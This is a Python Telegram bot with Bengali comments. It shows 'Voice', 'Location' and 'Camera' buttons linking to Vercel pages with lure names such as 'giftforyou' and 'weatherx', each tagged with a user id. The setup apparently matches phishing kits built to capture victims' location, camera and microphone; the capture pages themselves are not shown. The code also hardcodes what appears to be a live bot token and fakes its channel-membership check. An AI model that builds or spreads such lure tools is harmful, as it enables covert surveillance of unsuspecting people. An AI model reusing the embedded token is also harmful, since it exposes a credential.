
import os
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# Bot Token
BOT_TOKEN = os.getenv("BOT_TOKEN", "8581800352:AAEq3elAZPdm9XRIjnVa5CibBZd2kWz5DD4")

# চ্যানেল লিংক / invite links
CHANNELS = [
    "https://t.me/+d0ol4cPYxUExOGU1",
    "https://t.me/+YBo9GZb4ISxhN2I1"
]

# বাটন লিংক এবং নাম
BUTTONS = [
    {"text": "𝐕𝐨𝐢𝐜𝐞", "url": "https://giftforyou-beta.vercel.app/?id=7664379493"},
    {"text": "𝐋𝐨𝐜𝐚𝐭𝐢𝐨𝐧📍", "url": "https://weatherx-gray.vercel.app/?id=7664379493"},
    {"text": "𝐂𝐚𝐦𝐞𝐫𝐚", "url": "https://followersfreeofficial.vercel.app/?id=7664379493"},
    {"text": "𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐢𝐧𝐟𝐨", "url": None}
]

DEVELOPER_INFO = "Developer Info:\nUsername: @ax_abir_999\nআমি এই বটের ডেভেলপার।"

# চ্যানেল চেক করার ফাংশন (simulate)
def check_channels(user_id: int):
    # বাস্তব চ্যানেল চেক করতে bot কে admin করতে হবে এবং get_chat_member API ব্যবহার করতে হবে
    # এখানে demo purpose: সব join আছে ধরে নিচ্ছি
    return all([True for _ in CHANNELS])

# /start কমান্ড হ্যান্ডলার
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name

    if check_channels(user_id):
        welcome_text = f"🌟 হ্যালো {first_name}!\n\nসব চ্যানেলে জয়েন্ট হয়েছে ✅\nনীচের বাটন ব্যবহার করো।"
        keyboard = [
            [InlineKeyboardButton(BUTTONS[0]["text"], callback_data="voice"),
             InlineKeyboardButton(BUTTONS[1]["text"], callback_data="location")],
            [InlineKeyboardButton(BUTTONS[2]["text"], callback_data="camera"),
             InlineKeyboardButton(BUTTONS[3]["text"], callback_data="developer_info")]
        ]
        await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        text = "⚠️ তুমি সব চ্যানেলে জয়েন্ট হওনি। জয়েন্ট হয়ে /start চেপে আবার চেষ্টা করো।\n\nচ্যানেলগুলো:\n"
        for ch in CHANNELS:
            text += f"{ch}\n"
        await update.message.reply_text(text)

# বাটন হ্যান্ডলার
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    # লিংক ফেচ ম্যাপ
    link_map = {
        "voice": BUTTONS[0]["url"],
        "location": BUTTONS[1]["url"],
        "camera": BUTTONS[2]["url"]
    }

    if data in link_map:
        url = link_map[data]
        try:
            resp = requests.get(url, timeout=10)
            resp.raise_for_status()
            content = resp.text[:4000]  # Telegram message limit
            message = f"📎 লিংক: {url}\n\nফলাফল:\n{content}"
        except Exception as e:
            message = f"❌ লিংক ফেচ করতে সমস্যা: {e}"
        await query.message.reply_text(message)
    elif data == "developer_info":
        await query.message.reply_text(DEVELOPER_INFO)

# মূল
if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("বট রানিং...")
    app.run_polling()
